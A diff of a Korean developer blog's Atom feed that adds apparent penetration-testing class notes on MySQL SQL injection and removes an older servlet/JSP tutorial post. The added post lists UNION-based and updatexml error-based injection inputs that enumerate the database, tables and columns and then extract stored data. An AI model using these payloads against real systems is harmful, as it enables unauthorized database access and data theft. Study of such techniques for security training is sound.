@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-20T19:36:34+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-04-24T03:21:04+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoiZmxvd2NoYXJ0IFREXG5BW-uhnOq3uOyduCDsi5zrj4RdIC0tPiBCW-uhnOq3uOyduCDrsKnsi51dXG5CIC0tPiB87IS47IWYIOygleuztCDsl4bsnYx8IENb66Gc6re47JWE7JuDIOyDge2DnOyXkOyEnCDroZzqt7jsnbhdXG5CIC0tPiB87IS47IWYIOygleuztCDsnojsnYx8IERb7IS47IWYIOygleuztCDtmZXsnbhdXG5EIC0tPiBFW-q4sOqwhCDrp4zro4wg7ZmV7J24XVxuRSAtLT4gfFl8IENcbkUgLS0-IHxOfCBGW-yEuOyFmElE66GcIOygleuztCDqsIDsoLjsmKTquLBdXG5GIC0tPiBHW-yEseqztV1cbkMgLS0-IEhbSUQgLCBQV0Qg7J6F66ClXVxuSCAtLT4gSVvshLjshZjsoJXrs7Qg7IOd7ISxXVxuSSAtLT4gRyIsIm1lcm1haWQiOm51bGx9" /></p>
 
 <p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAo67iM65287Jqw7KCAKSAtPj4g7ISc67KEIDog66Gc6re47JWE7JuDIOyalOyyrVxu7ISc67KEIC0-PiDshJzrsoQgOiBzZXNzaW9uIGlkIOyCreygnFxu7ISc67KEIC0-PiDsgqzsmqnsnpAo67iM65287Jqw7KCAKSA6IOuhnOq3uOyduCDtjpjsnbTsp4Dso7zshowg66as64uk7J2066CJ7Yq4IOydkeuLtVxu7IKs7Jqp7J6QKOu4jOudvOyasOyggCkgLT4-IOyEnOuyhCA6IOuhnOq3uOyduCDtjpjsnbTsp4Ag7JqU7LKtXG7shJzrsoQgLT4-IOyCrOyaqeyekCjruIzrnbzsmrDsoIApIDog66Gc6re47J24IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
 
@@ -23,7 +23,146 @@
 </code></pre></div></div>
 <blockquote>
   <p>test</p>
-</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">웹 서버 만들기 (8) 회원가입 구현</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/" rel="alternate" type="text/html" title="웹 서버 만들기 (8) 회원가입 구현" /><published>2023-04-20T00:00:00+09:00</published><updated>2023-04-20T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/"><![CDATA[<h2 id="회원-가입-버튼-누르기-전">회원 가입 버튼 누르기 전</h2>
+</blockquote>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection 과정정리</title><link href="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/" rel="alternate" type="text/html" title="SQL Injection 과정정리" /><published>2023-04-24T00:00:00+09:00</published><updated>2023-04-24T23:13:00+09:00</updated><id>http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95</id><content type="html" xml:base="http://localhost:4000/SQLi%EB%B0%A9%EB%B2%95/"><![CDATA[<h3 id="환경">환경</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- MYSQL 서버
+</code></pre></div></div>
+
+<h3 id="질의문의-결과가-화면에-보일때">질의문의 결과가 화면에 보일때.</h3>
+<hr />
+<ul>
+  <li>게시판(글이 화면에 나옴), 회원정보(마이페이지), 주소검색, 검색페이지 등</li>
+</ul>
+
+<h5 id="sqli-과정">SQLi 과정</h5>
+<ol>
+  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
+    <ul>
+      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%----%' ...</code></li>
+    </ul>
+  </li>
+  <li><strong>SQL Injection</strong> 취약점 존재하는지 확인하기.
+    <ul>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' and '1%'='1%' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' and '1%'='1</code></li>
+    </ul>
+  </li>
+  <li>컬럼수 찾기.
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">order by</code> 를 이용하여 1씩 증가 시키면서 컬럼수를 찾아준다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' order by 1 -- %' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' order by 1 -- </code></li>
+    </ul>
+  </li>
+  <li>data 출력 위치 파악하기.
+    <ul>
+      <li>위에서 찾은 컬럼수를 이용하여 data 출력 위치 파악하기.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1','2','3','4' from dual -- %' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1','2','3','4' from dual -- </code></li>
+    </ul>
+  </li>
+  <li>database 이름 출력하기.
+    <ul>
+      <li>위에서 파악한 출력위치를 이용하여 DB 이름을 알아보자.</li>
+      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code> 명령을 이용하면 현재 DB 명이 나온다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',database(),'3','4' from dual -- %' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',database(),'3','4' from dual -- </code></li>
+    </ul>
+  </li>
+  <li>table 이름 출력하기.
+    <ul>
+      <li>위에서 파악한 DB이름을 이용하여 존재하는 테이블명을 알아보자.</li>
+      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명'</code> 명령을 이용하면 테이블명을 알 수 있다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- %' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',table_name,'3','4' from from information_schema.tables where table_schema='DB명' -- </code></li>
+    </ul>
+  </li>
+  <li>column 이름 출력하기.
+    <ul>
+      <li>위에서 파악한 table 이름을 이용하여 table의 컬럼명을 알아보자.</li>
+      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명'</code> 명령을 이용하면 해당 table의 컬럼명을 알 수 있다.</li>
+      <li>질의문 = `select xxxx from xxx where 컬럼명 like ‘%test%’ union select ‘1’,column_name,’3’,’4’ from information_schema.columns where table_name=’테이블명’ – %’ …</li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column_name,'3','4' from information_schema.columns where table_name='테이블명' -- </code></li>
+    </ul>
+  </li>
+  <li>정보 빼오기.
+    <ul>
+      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
+      <li><code class="language-plaintext highlighter-rouge">select column명 from table명</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명 like '%test%' union select '1',column명,'3','4' from table명 -- %' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">test%' union select '1',column명,'3','4' from table명 -- </code></li>
+    </ul>
+  </li>
+</ol>
+
+<p><br /><br /></p>
+<h3 id="질의문의-결과가-화면에-안보일때">질의문의 결과가 화면에 안보일때.</h3>
+<hr />
+<ul>
+  <li>로그인, 아이디 중복 체크.</li>
+</ul>
+
+<h5 id="조건">조건</h5>
+<ul>
+  <li>Error 메시지가 화면에 출력될때. ( <strong>Error Bases SQL Injection</strong> )</li>
+</ul>
+
+<h5 id="sqli-과정-1">SQLi 과정</h5>
+<ol>
+  <li>서버에서 어떤 질의문을 사용하는지 추측하기.
+    <ul>
+      <li>질의문 추측 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='----' ...</code></li>
+    </ul>
+  </li>
+  <li>오류 발생 확인하기. ( db 에러인지 확인하기 )
+    <ul>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">' asd</code></li>
+      <li><strong>syntax error 발생(문법 에러)</strong> 가 발생하는 것을 확인이 가능한지 본다.</li>
+    </ul>
+  </li>
+  <li>Error Based SQL Injection Function 동작하는지 확인하기.
+    <ul>
+      <li>Syntax error (문법에러) : 문법 틀리면 안됨. 컴파일 할 때 잡아낸다.</li>
+      <li>논리에러 : 실행이된다.</li>
+      <li>즉 우리는 논리에러를 발생시켜야 한다.</li>
+      <li><strong>updatexml</strong> 함수를 이용하자!</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,'test'), null) and '1'='1</code></li>
+      <li><code class="language-plaintext highlighter-rouge">XPATH syntax error: ':test'</code> 에러를 볼 수 있다.</li>
+      <li><code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(SQL)), null) and '1'='1' ...</code> test 대신 질의문을 넣어주면 된다.</li>
+    </ul>
+  </li>
+  <li>Database 이름 출력하기.
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">select database() from dual</code>  로 DB 명 찾기</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select database() from dual)), null) and '1'='1</code></li>
+    </ul>
+  </li>
+  <li>table 이름 출력하기.
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">select table_name from information_schema.tables where table_schema='DB명' limit 0,1</code> 로 table 명 찾기.</li>
+      <li>오류는 하나의 데이터만 보여줄 수 있다. 따라서 출력을 1개로 제한하였다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select table_name from information_schema.tables where table_schema='DB명' limit 0,1)), null) and '1'='1</code></li>
+      <li><code class="language-plaintext highlighter-rouge">limit</code> 를 조절하면서 원하는 테이블명을 찾는다.</li>
+    </ul>
+  </li>
+  <li>column 이름 출력하기.
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">select column_name from information_schema.columns where table_name='테이블명' limit 0,1</code> 로 table에 해당하는 column명 찾기.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column_name from information_schema.columns where table_name='테이블명' limit 0,1)), null) and '1'='1</code></li>
+    </ul>
+  </li>
+  <li>정보 빼오기
+    <ul>
+      <li>위에서 파악한 table명과 해당 table에 대한 column 명을 이용하여 정보를 빼오자!</li>
+      <li><code class="language-plaintext highlighter-rouge">select column명 from table명 limit 0,1</code> 명령을 이용하여 저장된 정보를 알 수 있다.</li>
+      <li>질의문 = <code class="language-plaintext highlighter-rouge">select xxxx from xxx where 컬럼명='1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1' ...</code></li>
+      <li>입력 = <code class="language-plaintext highlighter-rouge">1' and updatexml(null, concat(0x3a,(select column명 from table명 limit 0,1)), null) and '1'='1</code></li>
+    </ul>
+  </li>
+</ol>]]></content><author><name>Jung MinGyu</name></author><category term="Mysql DB" /><category term="DB" /><category term="sql injection" /><summary type="html"><![CDATA[sql injection 보다 쉽게 할 수 있는 과정을 정리하였다.]]></summary></entry><entry><title type="html">웹 서버 만들기 (8) 회원가입 구현</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/" rel="alternate" type="text/html" title="웹 서버 만들기 (8) 회원가입 구현" /><published>2023-04-20T00:00:00+09:00</published><updated>2023-04-20T23:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C8/"><![CDATA[<h2 id="회원-가입-버튼-누르기-전">회원 가입 버튼 누르기 전</h2>
 
 <p><br /></p>
 <h3 id="회원가입-버튼-추가">회원가입 버튼 추가</h3>
@@ -1708,64 +1847,4 @@ RSAPSSSHA512(…)
   <li><a href="https://docs.rockylinux.org/guides/network/basic_network_configuration/">Network Configuration - Documentation (rockylinux.org)</a></li>
   <li><a href="https://taisou.tistory.com/622">sqlplus 에서 한글이 깨질때 (tistory.com)</a></li>
   <li><a href="https://mkil.tistory.com/336">ORACLE DB 시작 및 중지 / 리스너 시작 및 중지 하는방법 (tistory.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="DB" /><summary type="html"><![CDATA[DB 설치 및 실행]]></summary></entry><entry><title type="html">웹서버 만들기(3)</title><link href="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C3/" rel="alternate" type="text/html" title="웹서버 만들기(3)" /><published>2023-04-04T00:00:00+09:00</published><updated>2023-04-05T00:13:00+09:00</updated><id>http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C3</id><content type="html" xml:base="http://localhost:4000/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C3/"><![CDATA[<p><a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C1/">웹서버 만들기(1)</a><br />
-<a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C2/">웹서버 만들기(2)</a></p>
-
-<h3 id="servlet-에서-클라이언트에게-jsp-페이지-보여주기">Servlet 에서 클라이언트에게 JSP 페이지 보여주기</h3>
-<ul>
-  <li>서버 구조 ( MVC )
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>클라이언트 &lt;&gt; ningx &gt; servlet &gt; jsp
-              ^─────────────────┘
-</code></pre></div>    </div>
-  </li>
-  <li><strong>Servlet</strong> 은 controller 역할을 한다.</li>
-  <li><strong>JSP</strong> 는 view 역할을 한다.</li>
-</ul>
-
-<h3 id="java-프로젝트-만들기">Java 프로젝트 만들기</h3>
-<ul>
-  <li>servlet 을 위한 java 프로젝트를 만들어 보자. 폴더를 다음과 같은 구조로 만들어 주자.
-    <ol>
-      <li>프로젝트 폴더를 생성한다.</li>
-      <li><code class="language-plaintext highlighter-rouge">src/main/java</code> 폴더에 자바 소스코드 또는 패키지를 넣을 것이다.</li>
-      <li><code class="language-plaintext highlighter-rouge">bin/classes</code> 폴더에 컴파일 이후의 파일을 저장할 것이다.</li>
-      <li><code class="language-plaintext highlighter-rouge">lib</code> 폴더는 서드파티 라이브러리 <strong>.jar</strong> 파일을 저장하는 곳이다.</li>
-    </ol>
-  </li>
-</ul>
-
-<script src="https://gist.github.com/MinGyu2/83a33cde802da763e373e3fbab898e9b.js"></script>
-
-<h3 id="servlet을-위한-java-소스코드-작성하기">Servlet을 위한 Java 소스코드 작성하기</h3>
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">cd src/main/java</code> 폴더로 이동하자.</li>
-  <li>패키지 경로를 만들고 패키지 경로로 이동한다.<br /><code class="language-plaintext highlighter-rouge">src/main/java/com/example/app</code></li>
-  <li><code class="language-plaintext highlighter-rouge">app</code> 폴더에 <strong>App.java</strong> 파일을 만들어준다. 그리고 다음 내용을 추가해주자.<br /><script src="https://gist.github.com/MinGyu2/9734ce99aaf29132f1078614602eec0e.js"></script></li>
-  <li>컴파일하기 전 <strong>servlet-api.jar</strong> 파일을 lib 폴더에 넣어줘야한다. <code class="language-plaintext highlighter-rouge">servlet-api.jar</code> 파일은 <code class="language-plaintext highlighter-rouge">apache-tomcat-10.1.7/lib/servlet-api.jar</code> 에 있다.</li>
-  <li>컴파일을 해보자. 위의 프로젝트 경로를 잘 알아두자. 자바 프로젝트의 루트 위치에서 다음 명령을 실행시켜주자.<br /><code class="language-plaintext highlighter-rouge">-cp</code> 에는 서드파티 라이브러리(.jar 파일)가 있는 경로를 적어주면 된다.<br /><code class="language-plaintext highlighter-rouge">-sourcepath</code> 는 소스코드 또는 패키지가 저장되는 경로를 적어주면된다.<br /><code class="language-plaintext highlighter-rouge">-d</code> 는 컴파일 결과가 저장되는 위치를 적어주면된다.<br /><script src="https://gist.github.com/MinGyu2/457d7264008556c6f9460276fb268718.js"></script></li>
-  <li><code class="language-plaintext highlighter-rouge">bin/classes</code> 폴더안에 컴파일 결과가 저장된 것을 확인해 볼 수 있다.<br /><script src="https://gist.github.com/MinGyu2/0f410f7860e12bb3f9e9765ad2127933.js"></script></li>
-</ol>
-
-<h3 id="servlet과-jsp-동작-하기">Servlet과 Jsp 동작 하기</h3>
-<ol>
-  <li><code class="language-plaintext highlighter-rouge">WEB-INF</code> 처음구조<br /><script src="https://gist.github.com/MinGyu2/4ac06f9d8f4e1b92cc1c7a453dca5b58.js"></script></li>
-  <li><code class="language-plaintext highlighter-rouge">myWeb/ROOT/WEB-INF/classes</code> 폴더로 <code class="language-plaintext highlighter-rouge">bin/classes</code> 안에 있는 <strong>com</strong> 폴더를 옮겨주자. 그러면 <code class="language-plaintext highlighter-rouge">WEB-INF</code> 의 구조는 다음과 같다.<br />이제 사용안 할 전 <a href="https://mingyu2.github.io/%EC%9B%B9%EC%84%9C%EB%B2%84%EA%B0%9C%EB%B0%9C2/">단계</a>에서 만들었던 <code class="language-plaintext highlighter-rouge">classes/App.class</code> 파일은 삭제해주자.<br /><script src="https://gist.github.com/MinGyu2/264b4f723a54dce362f9e48c1344d605.js"></script></li>
-  <li>그리고 <code class="language-plaintext highlighter-rouge">WEB-INF</code> 폴더에 <strong>test.jsp</strong> 파일 만들어주자. 그리고 다음 내용을 추가해 주자.<br /><script src="https://gist.github.com/MinGyu2/caca9928fb057b6bfa231ee02c22e13c.js"></script></li>
-  <li><strong>web.xml</strong> 파일도 수정해줘야 한다.  수정을 안해주면 자바 클래스를 못찾는다.<br /><img src="https://user-images.githubusercontent.com/31990118/229791396-d276256f-0643-4ce3-8980-e1a71550fd08.png" alt="Pasted image 20230404195832" /><br /><code class="language-plaintext highlighter-rouge">&lt;servlet-class&gt;App&lt;/servlet-class&gt;</code> 을 <code class="language-plaintext highlighter-rouge">&lt;servlet-class&gt;com.example.app.App&lt;/servlet-class&gt;</code> 로 변경해 줘야한다.<br /><script src="https://gist.github.com/MinGyu2/c0662d9a500b96d7fe2ead8e3a872f6f.js"></script></li>
-  <li>최종적으로 나오는 <code class="language-plaintext highlighter-rouge">WEB-INF</code> 폴더의 구조는 다음과 같다.<br /><script src="https://gist.github.com/MinGyu2/e4f05014b8c6734e94f316ede76f77f3.js"></script></li>
-  <li>톰캣을 재시작해주면 된다. <br /><code class="language-plaintext highlighter-rouge">./apache-tomcat-10.1.7/bin/shutdown.sh</code> 톰캣 중지<br /><code class="language-plaintext highlighter-rouge">./apache-tomcat-10.1.7/bin/startup.sh</code> 톰캣 시작<br />그리고 브라우저를 통해 <code class="language-plaintext highlighter-rouge">http://localhost</code> or <code class="language-plaintext highlighter-rouge">http://localhost:8080</code> 로 접속하면 다음과 같은 화면이 나올 것 이다.<br /><img src="https://user-images.githubusercontent.com/31990118/229791799-b7918215-2922-4d2d-b0ab-20974f0eb8cc.png" alt="Pasted image 20230404200357" /></li>
-  <li>다음 구조로 서버가 동작하고 있다.
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>클라이언트 &lt;&gt; ningx &gt; servlet(App.java) &gt; jsp (test.jsp)
-              ^─────────────────────────────┘
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h3 id="참고사이트">참고사이트</h3>
-<ul>
-  <li><a href="https://velog.io/@lee_choonghee/Java-IDE-%EC%97%86%EC%9D%B4-%EA%B0%9C%EB%B0%9C%ED%95%98%EA%B8%B0">Java IDE 없이 개발하기 (velog.io)</a></li>
-  <li><a href="https://stackoverflow.com/questions/22928427/how-to-redirect-to-jsp-inside-web-inf-folder">java - How to redirect to JSP inside WEB-INF folder - Stack Overflow</a></li>
-  <li><a href="https://www.tutorialspoint.com/servlets/servlets-packaging.htm">Servlets - Packaging (tutorialspoint.com)</a></li>
-  <li><a href="https://dololak.tistory.com/502">서블릿/JSP RequestDispatcher란. RequestDispatcher로 forward() 하기</a></li>
-  <li><a href="https://initialcommit.com/blog/how-to-send-data-from-servlet-to-jsp">How to send data from Java Servlet to JSP </a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="nginx" /><category term="tomcat" /><category term="servlet" /><category term="jsp" /><summary type="html"><![CDATA[간단한 로그인 서버를 만들기 (3)]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="DB" /><summary type="html"><![CDATA[DB 설치 및 실행]]></summary></entry></feed>
